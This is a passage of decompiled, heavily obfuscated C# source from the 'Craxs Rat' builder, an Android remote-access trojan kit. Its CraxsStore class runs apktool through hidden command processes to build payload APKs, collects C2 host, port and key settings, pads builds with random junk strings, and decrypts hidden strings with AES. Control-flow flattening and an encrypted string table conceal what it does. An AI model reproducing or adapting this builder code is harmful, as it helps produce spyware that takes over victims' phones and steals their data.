          (object) (EXGuarder.\u0030B43701C + ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).folder_apktool + EXGuarder.\u0030816184A + ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).folder_apktool + EXGuarder.\u003404A2D39 + ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).folder_apktool + EXGuarder.\u00313074E50 + Settings.Storepath + EXGuarder.\u00326733268 + ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).appnamebuild.Replace(EXGuarder.\u0035715535F, EXGuarder.\u00310167179) + EXGuarder.\u00355274B36 + ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).folder_apktool + EXGuarder.\u0033B2E1037 + str1 + EXGuarder.\u0032D100B6F + str1 + EXGuarder.\u0033D0C7238)
        }, (string[]) null, (Type[]) null, (bool[]) null, true);
label_42:
        int num12 = -726403547;
        while (true)
        {
          uint num13;
          switch ((num13 = (uint) -(~--num12 + -(-1834366026 ^ -634747480))) % 3U)
          {
            case 0:
              goto label_4;
            case 1:
              // ISSUE: reference to a compiler-generated field
              ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).FolderApk = true;
              num12 = (int) num13 * 1243060173 ^ -67031108;
              continue;
            case 2:
              goto label_42;
            default:
              goto label_47;
          }
        }
label_4:
        return;
label_47:
        return;
label_31:
        if (string.IsNullOrEmpty(Conversions.ToString(NewLateBinding.LateGet(b01, (Type) null, EXGuarder.\u003096F4D75, new object[0], (string[]) null, (Type[]) null, (bool[]) null))))
          return;
        num1 = -589028246;
        goto label_2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void ex()
    {
      try
      {
        this.Close_cmd();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      finally
      {
      }
    }

    public string madladstr()
    {
      return Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(this.RandomShit(400, 1000), (object) EXGuarder.\u0035630043E), (object) this.RandommMad(400, 1000)), (object) EXGuarder.\u0035630043E), this.RandomShit(400, 1000)), (object) EXGuarder.\u0035630043E), (object) this.RandommMad(400, 1000)));
    }

    public string RandommMad(int minCharacters, int maxCharacters)
    {
      string str1 = EXGuarder.\u0035C4F4B35;
      // ISSUE: reference to a compiler-generated field
      if (((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).rshit != null)
        goto label_4;
label_1:
      int num1 = -551385267;
label_2:
      string str2;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ~(((603869403 * (1180170291 * (519142452 - 701238497 - (1041760486 - 168953510))) ^ ~68803270 * -2031305149 ^ (-838742792 ^ -84664557 ^ -784890623 - -1986988864) + (~1151861688 + (1627538378 ^ 1041181039))) - num2 ^ (1197313811 + --1249399609 ^ 558004628 - 463619926 + (-1726967258 - -2116238998)) + -(~1674959133 - 1112525880) ^ -(-991501672 - -257752312) ^ 1589133954 - 1312895052 - ~-1000666722) + ~(1950569510 ^ -1550818651) ^ ~-865432923)) % 7U)
        {
          case 0:
            goto label_4;
          case 2:
            // ISSUE: reference to a compiler-generated field
            str2 += Conversions.ToString(str1[((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).rshit.Next(0, checked (str1.Length - 1))]);
            num1 = -1689998039;
            continue;
          case 3:
            num1 = (int) num3 * 2127926078 ^ 1325859679;
            continue;
          case 4:
            goto label_1;
          case 5:
            // ISSUE: reference to a compiler-generated field
            ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).rshit = new Random();
            num1 = (int) num3 * -63889781 ^ -153949436;
            continue;
          case 6:
            int num4;
            num1 = num4 = str2.Length < minCharacters ? 571702817 : (num4 = -1868644959);
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      // ISSUE: variable of a reference type
      int& local;
      // ISSUE: reference to a compiler-generated field
      // ISSUE: explicit reference operation
      int num5 = checked (^(local = ref ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).cou3) + 1);
      local = num5;
      // ISSUE: reference to a compiler-generated field
      return str2.ToString().ToLower() + Conversions.ToString(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).cou3);
label_4:
      str2 = EXGuarder.\u00350296138;
      num1 = -1762672863;
      goto label_2;
    }

    private void Close_cmd()
    {
      try
      {
        Application.ExitThread();
label_1:
        int num1 = 1082018132;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((~num1 ^ ~(~-1402297970 ^ -1148713149 - 1513578943) - (~377243550 - 1240177793)) * -1489558603)) % 4U)
          {
            case 1:
              // ISSUE: reference to a compiler-generated field
              NewLateBinding.LateCall(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD, (Type) null, EXGuarder.\u00368221D33, new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
              // ISSUE: reference to a compiler-generated field
              NewLateBinding.LateCall(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD, (Type) null, EXGuarder.\u00312162421, new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
              num1 = (int) num2 * 1503111217 ^ 959711939;
              continue;
            case 2:
              goto label_1;
            case 3:
              // ISSUE: reference to a compiler-generated field
              NewLateBinding.LateCall(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD, (Type) null, EXGuarder.\u0032B5E1C35, new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
              num1 = (int) num2 * 2074762696 ^ -1098235383;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        // ISSUE: reference to a compiler-generated field
        NewLateBinding.LateCall(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD, (Type) null, EXGuarder.\u00375675D28, new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private bool CMD_running()
    {
      bool flag;
      try
      {
        // ISSUE: reference to a compiler-generated field
        ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD = (object) new Process();
        // ISSUE: reference to a compiler-generated field
        NewLateBinding.LateSetComplex(NewLateBinding.LateGet(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD, (Type) null, EXGuarder.\u00335162A4B, new object[0], (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u00338715A13, new object[1]
        {
          (object) true
        }, (string[]) null, (Type[]) null, false, true);
        // ISSUE: reference to a compiler-generated field
        NewLateBinding.LateSetComplex(NewLateBinding.LateGet(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD, (Type) null, EXGuarder.\u00335162A4B, new object[0], (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u00328161C29, new object[1]
        {
          (object) true
        }, (string[]) null, (Type[]) null, false, true);
        // ISSUE: reference to a compiler-generated field
        NewLateBinding.LateSetComplex(NewLateBinding.LateGet(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD, (Type) null, EXGuarder.\u00335162A4B, new object[0], (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u003331A5508, new object[1]
        {
          (object) true
        }, (string[]) null, (Type[]) null, false, true);
label_1:
        int num1 = 1877995794;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(num1 + (-1100335433 * 1006150085 - -(321417077 - 182902404) ^ ~(--231309491 * 131557221) ^ ~~1347174878 - (894248463 ^ 842152816 ^ ~-488426562) - ((1160085192 - 1956694127) * 421079445 - ~~-701657319)) + (2029811080 - 913660856 - ~-1704868267 + (1761952174 - 881861555 - 1674598701 * 1856520102) - (~-724558611 - ~-1709358427 - ~(-1570463338 - 1016974262))) ^ 323217506 - -141308599 - ((-546808696 ^ -1348970944) + (-1509548420 - 1923503848))) - (-1655019371 - -237752734))) % 9U)
          {
            case 0:
              // ISSUE: reference to a compiler-generated field
              NewLateBinding.LateSetComplex(NewLateBinding.LateGet(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD, (Type) null, EXGuarder.\u00335162A4B, new object[0], (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u00357154328, new object[1]
              {
                (object) true
              }, (string[]) null, (Type[]) null, false, true);
              num1 = (int) num2 * 625956575 ^ 113372797;
              continue;
            case 1:
              // ISSUE: reference to a compiler-generated field
              NewLateBinding.LateCall(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD, (Type) null, EXGuarder.\u00345504100, new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
              num1 = (int) num2 * 547867862 ^ 1161868535;
              continue;
            case 2:
              // ISSUE: reference to a compiler-generated field
              NewLateBinding.LateSetComplex(NewLateBinding.LateGet(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD, (Type) null, EXGuarder.\u00335162A4B, new object[0], (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u003206F1475, new object[1]
              {
                (object) ProcessWindowStyle.Hidden
              }, (string[]) null, (Type[]) null, false, true);
              // ISSUE: reference to a compiler-generated field
              NewLateBinding.LateSet(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD, (Type) null, EXGuarder.\u0031D413710, new object[1]
              {
                (object) true
              }, (string[]) null, (Type[]) null);
              num1 = (int) num2 * 252633967 ^ -1428719016;
              continue;
            case 3:
              // ISSUE: reference to a compiler-generated field
              NewLateBinding.LateCall(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD, (Type) null, EXGuarder.\u003345F465D, new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
              num1 = (int) num2 * -1851331446 ^ -586324975;
              continue;
            case 5:
              // ISSUE: reference to a compiler-generated field
              ((Process) ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD).OutputDataReceived += new DataReceivedEventHandler(this.Sync_Output);
              // ISSUE: reference to a compiler-generated field
              ((Process) ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD).ErrorDataReceived += new DataReceivedEventHandler(this.Sync_Output);
              // ISSUE: reference to a compiler-generated field
              ((Process) ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD).Exited += (EventHandler) ((a0, a1) => this.ex());
              // ISSUE: reference to a compiler-generated field
              NewLateBinding.LateSetComplex(NewLateBinding.LateGet(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD, (Type) null, EXGuarder.\u00335162A4B, new object[0], (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0033D565469, new object[1]
              {
                (object) false
              }, (string[]) null, (Type[]) null, false, true);
              num1 = (int) num2 * -399333142 ^ 1337109957;
              continue;
            case 6:
              goto label_1;
            case 7:
              // ISSUE: reference to a compiler-generated field
              NewLateBinding.LateCall(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD, (Type) null, EXGuarder.\u0036A0B5B44, new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
              num1 = (int) num2 * -1707120302 ^ 1948005281;
              continue;
            case 8:
              // ISSUE: reference to a compiler-generated field
              NewLateBinding.LateSetComplex(NewLateBinding.LateGet(((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).CMD, (Type) null, EXGuarder.\u00335162A4B, new object[0], (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032853714D, new object[1]
              {
                (object) EXGuarder.\u0034E2F392B
              }, (string[]) null, (Type[]) null, false, true);
              num1 = (int) num2 * -1818421952 ^ -335981819;
              continue;
            default:
              goto label_10;
          }
        }
label_10:
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_12:
        int num3 = -1512204040;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (-(num3 + (-1100335433 * 1006150085 - -(321417077 - 182902404) ^ ~(--231309491 * 131557221) ^ ~~1347174878 - (894248463 ^ 842152816 ^ ~-488426562) - ((1160085192 - 1956694127) * 421079445 - ~~-701657319)) + (2029811080 - 913660856 - ~-1704868267 + (1761952174 - 881861555 - 1674598701 * 1856520102) - (~-724558611 - ~-1709358427 - ~(-1570463338 - 1016974262))) ^ 323217506 - -141308599 - ((-546808696 ^ -1348970944) + (-1509548420 - 1923503848))) - (-1655019371 - -237752734))) % 3U)
          {
            case 1:
              flag = false;
              num3 = (int) num4 * -1565960055 ^ -322005603;
              continue;
            case 2:
              goto label_12;
            default:
              goto label_15;
          }
        }
label_15:
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public static void DeleteDirectory(string target_dir)
    {
      string[] files = Directory.GetFiles(target_dir);
      string[] directories = Directory.GetDirectories(target_dir);
label_1:
      int num1 = 928318692;
      string[] strArray1;
      int index1;
      string path;
      int index2;
      string[] strArray2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) --((~num1 + (-657699254 - -94748357 * ~~547169009) - (~571246171 ^ -2051950857)) * 1699676561)) % 12U)
        {
          case 0:
            int num3;
            num1 = num3 = index1 < strArray1.Length ? 1848594978 : (num3 = 1042712833);
            continue;
          case 1:
            path = strArray1[index1];
            System.IO.File.SetAttributes(path, FileAttributes.Normal);
            num1 = -1913941015;
            continue;
          case 2:
            strArray2 = directories;
            num1 = (int) num2 * 667002966 ^ 1699715340;
            continue;
          case 3:
            index2 = 0;
            num1 = (int) num2 * 1867902761 ^ -805227700;
            continue;
          case 4:
            int num4;
            num1 = num4 = index2 < strArray2.Length ? 262939371 : (num4 = -736501526);
            continue;
          case 5:
            goto label_1;
          case 6:
            index1 = 0;
            num1 = (int) num2 * 949685212 ^ 2123682731;
            continue;
          case 7:
            strArray1 = files;
            num1 = (int) num2 * 646830936 ^ -214442163;
            continue;
          case 8:
            CraxsStore.DeleteDirectory(strArray2[index2]);
            checked { ++index2; }
            num1 = 1179537487;
            continue;
          case 9:
            Directory.Delete(target_dir, false);
            num1 = (int) num2 * 1415542829 ^ 287798173;
            continue;
          case 10:
            System.IO.File.Delete(path);
            checked { ++index1; }
            num1 = (int) num2 * 50676587 ^ -693058635;
            continue;
          case 11:
            goto label_3;
          default:
            goto label_14;
        }
      }
label_3:
      return;
label_14:;
    }

    public string GetDriv()
    {
      string driv;
      try
      {
        string[] separator = new string[1]
        {
          EXGuarder.\u0036862016C
        };
label_1:
        int num1 = -1900339571;
        string[] strArray;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (-617457967 - -~(-1682979496 - ~num2 * -1218480637))) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              strArray = Application.StartupPath.Split(separator, StringSplitOptions.RemoveEmptyEntries);
              num1 = (int) num3 * 1259233104 ^ 1992811850;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        driv = strArray[0].ToString() + EXGuarder.\u0036862016C;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_6:
        int num4 = 1968880569;
        while (true)
        {
          int num5 = num4;
          uint num6;
          switch ((num6 = (uint) (-617457967 - -~(-1682979496 - ~num5 * -1218480637))) % 3U)
          {
            case 0:
              goto label_6;
            case 2:
              driv = EXGuarder.\u00350646169;
              ProjectData.ClearProjectError();
              num4 = (int) num6 * 1328500185 ^ -56199910;
              continue;
            default:
              goto label_9;
          }
        }
      }
label_9:
      return driv;
    }

    private string D(string v) => Encoding.UTF8.GetString(Convert.FromBase64String(v));

    public string CraxsRatkfvuiorkenfudpajrsnCraxsRatssvdweesdfwefdfsdf(
      string text,
      string password)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
label_1:
      int num1 = -235487359;
      ICryptoTransform decryptor;
      byte[] inputBuffer;
      string str1;
      byte[] hash;
      byte[] destinationArray;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((((num1 ^ -1621598521 * ((~-2000838158 + 471562969 * 299299323 ^ 211110287 - ~-255624787) - 933581195)) - ~2107834378) * -126570569 * 15400185 ^ -239364868) - 1203356147)) % 8U)
        {
          case 0:
            Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
            Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
            num1 = (int) num2 * -1498127583 ^ 24996861;
            continue;
          case 1:
            decryptor = rijndaelManaged.CreateDecryptor();
            num1 = (int) num2 * -1902169173 ^ 1163791533;
            continue;
          case 2:
            goto label_1;
          case 3:
            rijndaelManaged.Key = destinationArray;
            rijndaelManaged.Mode = CipherMode.ECB;
            num1 = (int) num2 * -1842756945 ^ 1389585390;
            continue;
          case 5:
            str1 = Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
            num1 = (int) num2 * -1064782798 ^ -407947810;
            continue;
          case 6:
            inputBuffer = Convert.FromBase64String(text);
            num1 = (int) num2 * 735598443 ^ -906331971;
            continue;
          case 7:
            MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
            string str2 = EXGuarder.\u003511E691D;
            destinationArray = new byte[32];
            hash = cryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(password));
            num1 = (int) num2 * 1471119292 ^ 1302300548;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return str1;
    }

    private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
    {
      this.workpanel.SendToBack();
      this.showworkbtn.Visible = true;
    }

    private void DrakeUIButtonIcon3_Click(object sender, EventArgs e) => this.Close();

    private void b_ok_click(object sender, EventArgs e)
    {
    }

    private void Showworkbtn_Click(object sender, EventArgs e) => this.workpanel.BringToFront();

    private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
    {
      try
      {
        if (Directory.Exists(Settings.Storepath + EXGuarder.\u0030B100D5C))
          goto label_5;
label_1:
        int num1 = 1705459473;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(num1 ^ 28674241 ^ ~(-950745313 - -313457324) - ---1814860162 ^ 1185930149 * ~~(469669703 ^ -1484939794) ^ 1163576700 - (-592766053 - ~1430322682 ^ -10777359))) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              Directory.CreateDirectory(Settings.Storepath + EXGuarder.\u0030B100D5C);
              num1 = (int) num2 * -702459801 ^ -1737275080;
              continue;
            case 2:
              goto label_3;
            case 3:
              goto label_5;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:
        return;
label_5:
        Process.Start(Settings.Storepath + EXGuarder.\u0030B100D5C);
        num1 = 442394906;
        goto label_2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwefghcvbeefrw(object sender, EventArgs e)
    {
      if (!(string.IsNullOrEmpty(this.Host.Text) | string.IsNullOrWhiteSpace(this.Host.Text)))
        goto label_9;
label_1:
      int num1 = 172344352;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ~(~-1819996641 - (197328708 ^ -878911764) - ~(-num2 * -1500623701) - (-911777631 - -551662078))) % 9U)
        {
          case 0:
            Codes.MyMsgBox(EXGuarder.\u0032A0A5921, EXGuarder.\u00370540150, false, Craxs_Rat.My.Resources.Resources.warning48px);
            num1 = (int) num3 * -1494544748 ^ -1138905748;
            continue;
          case 1:
            int num4;
            num1 = num4 = !(string.IsNullOrEmpty(this.TheKey.Text) | string.IsNullOrWhiteSpace(this.TheKey.Text)) ? 1013704378 : (num4 = -697165299);
            continue;
          case 2:
            goto label_7;
          case 3:
            goto label_9;
          case 4:
            goto label_1;
          case 5:
            Codes.MyMsgBox(EXGuarder.\u0032A0A5921, EXGuarder.\u0035B272A13, false, Craxs_Rat.My.Resources.Resources.warning48px);
            num1 = (int) num3 * 1514036799 ^ 256506893;
            continue;
          case 6:
            goto label_5;
          case 8:
            goto label_4;
          default:
            goto label_11;
        }
      }
label_7:
      return;
label_5:
      return;
label_4:
      Codes.MyMsgBox(EXGuarder.\u0032A0A5921, EXGuarder.\u003523F0F49, false, Craxs_Rat.My.Resources.Resources.warning48px);
      return;
label_11:
      if (!Codes.MyMsgBox(EXGuarder.\u0031554514D, EXGuarder.\u0034221144A + this.Host.Text + EXGuarder.\u0037332164F + this.Port.Text + EXGuarder.\u00340713F23 + this.TheKey.Text, true, Craxs_Rat.My.Resources.Resources.sucess48px))
        return;
      try
      {
        if (this.DGVSTORE.SelectedRows.Count > 0)
        {
label_13:
          int num5 = 2038882511;
          while (true)
          {
            int num6 = num5;
            uint num7;
            List<string> stringList;
            string[] tag;
            switch ((num7 = (uint) ~(~-1819996641 - (197328708 ^ -878911764) - ~(-num6 * -1500623701) - (-911777631 - -551662078))) % 16U)
            {
              case 0:
                stringList.Add(tag[3]);
                num5 = (int) num7 * 2000647698 ^ 5073331;
                continue;
              case 1:
                stringList.Add((string) this.DGVSTORE.SelectedRows[0].Cells[1].Value);
                num5 = (int) num7 * 424356651 ^ -1276667646;
                continue;
              case 2:
                stringList.Add(tag[0]);
                num5 = (int) num7 * -950687214 ^ 792298314;
                continue;
              case 3:
                this.worklabel.Text = (string) this.DGVSTORE.SelectedRows[0].Cells[1].Value + EXGuarder.\u003443C0274 + (string) this.DGVSTORE.SelectedRows[0].Cells[2].Value + EXGuarder.\u003443C0274 + (string) this.DGVSTORE.SelectedRows[0].Cells[4].Value;
                num5 = (int) num7 * -1637005004 ^ -1730293519;
                continue;
              case 4:
                this.worklog.Text = EXGuarder.\u00356666878;
                this.downloadworker.RunWorkerAsync((object) stringList);
                num5 = (int) num7 * -1824355802 ^ 345652893;
                continue;
              case 6:
                stringList.Add(this.ComboPrims.Text);
                num5 = (int) num7 * 1930039273 ^ -1253158654;
                continue;
              case 7:
                tag = (string[]) this.DGVSTORE.SelectedRows[0].Tag;
                stringList = new List<string>();
                num5 = 1873663399;
                continue;
              case 8:
                this.workimage.Image = (Image) this.DGVSTORE.SelectedRows[0].Cells[0].Value;
                num5 = (int) num7 * -2042609987 ^ 901006002;
                continue;
              case 9:
                goto label_3;
              case 10:
                int num8 = !this.downloadworker.IsBusy ? -554972972 : (num8 = 261337386);
                num5 = num8 ^ (int) num7 * -598218275;
                continue;
              case 11:
                goto label_13;
              case 12:
                this.workpanel.BringToFront();
                num5 = (int) num7 * 733024780 ^ -2115283940;
                continue;
              case 13:
                goto label_22;
              case 14:
                stringList.Add(tag[2]);
                num5 = (int) num7 * -158985660 ^ -25838903;
                continue;
              case 15:
                stringList.Add(tag[1]);
                num5 = (int) num7 * 328667042 ^ -500196507;
                continue;
              default:
                goto label_28;
            }
          }
label_3:
          return;
label_22:
          Codes.MyMsgBox(EXGuarder.\u0033A167854, EXGuarder.\u0032F27485E, false, Craxs_Rat.My.Resources.Resources.error48px);
          return;
        }
label_28:
        Codes.MyMsgBox(EXGuarder.\u003420E5272, EXGuarder.\u00323285B32, false, Craxs_Rat.My.Resources.Resources.error48px);
        return;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Codes.MyMsgBox(EXGuarder.\u0032B294F6C, EXGuarder.\u003480C6400, false, Craxs_Rat.My.Resources.Resources.error48px);
label_30:
        int num9 = 658519180;
        while (true)
        {
          int num10 = num9;
          uint num11;
          switch ((num11 = (uint) ~(~-1819996641 - (197328708 ^ -878911764) - ~(-num10 * -1500623701) - (-911777631 - -551662078))) % 3U)
          {
            case 0:
              goto label_34;
            case 1:
              ProjectData.ClearProjectError();
              num9 = (int) num11 * -1454754427 ^ -1588750457;
              continue;
            case 2:
              goto label_30;
            default:
              goto label_35;
          }
        }
label_34:
        return;
label_35:
        return;
      }
label_9:
      num1 = !(string.IsNullOrEmpty(this.Port.Text) | string.IsNullOrWhiteSpace(this.Port.Text)) ? 1815599292 : (num1 = -1105840481);
      goto label_2;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatswefzxcuyhg(object sender, EventArgs e)
    {
      try
      {
        if (!Codes.MyMsgBox(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatssvdweesdfwefdfsdf(EXGuarder.\u00324327507, EXGuarder.\u0030C412F53), this.CraxsRatkfvuiorkenfudpajrsnCraxsRatssvdweesdfwefdfsdf(EXGuarder.\u0032B4A342A, EXGuarder.\u0032A5A0702), true, Craxs_Rat.My.Resources.Resources.error48px))
          return;
label_1:
        int num1 = 464849089;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(-~num1 * 1864700987) ^ 452368776 + 1471190301)) % 3U)
          {
            case 0:
              goto label_6;
            case 1:
              Process.Start(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatssvdweesdfwefdfsdf(EXGuarder.\u003166B3245, EXGuarder.\u0032A310556));
              num1 = (int) num2 * -1249674555 ^ -1190701597;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_7;
          }
        }
label_6:
        return;
label_7:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void DGVSTORE_CellClick(object sender, DataGridViewCellEventArgs e)
    {
      if (this.DGVSTORE.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = -1260332948;
      int num2;
      int index;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) ~~~num1) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num2 = checked (this.DGVSTORE.Rows.Count - 1);
            index = 0;
            num1 = (int) num3 * 470007069 ^ -728817212;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      if (index <= num2)
      {
        try
        {
          if (Operators.ConditionalCompareObjectEqual(this.DGVSTORE.Rows[index].Cells[6].Value, (object) true, false))
          {
label_6:
            int num4 = -1558503384;
            while (true)
            {
              uint num5;
              switch ((num5 = (uint) ~~~num4) % 3U)
              {
                case 0:
                  goto label_6;
                case 2:
                  this.DGVSTORE.Rows[index].Cells[6].Value = (object) false;
                  num4 = (int) num5 * -148225029 ^ -2081279379;
                  continue;
                default:
                  goto label_11;
              }
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
label_11:
        checked { ++index; }
      }
      else
        goto label_16;
label_12:
      int num6 = -1517536334;
label_13:
      uint num7;
      switch ((num7 = (uint) ~~~num6) % 4U)
      {
        case 0:
          return;
        case 1:
          goto label_4;
        case 2:
          goto label_12;
        case 3:
          break;
        default:
          return;
      }
label_16:
      this.DGVSTORE.SelectedRows[0].Cells[6].Value = (object) true;
      num6 = -227796393;
      goto label_13;
    }

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public extern CraxsStore(object TargetObject, IntPtr TargetMethod);

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public virtual extern IAsyncResult BeginInvoke(
      object[] objs,
      AsyncCallback DelegateCallback,
      object DelegateAsyncState);

    public delegate void InvocationDelegate(object[] objs);

    public delegate void recordnames(object[] obj);

    public delegate void delestatustext(object[] obj);

    public delegate void Delegate0(object d0, object b0);
  }
}
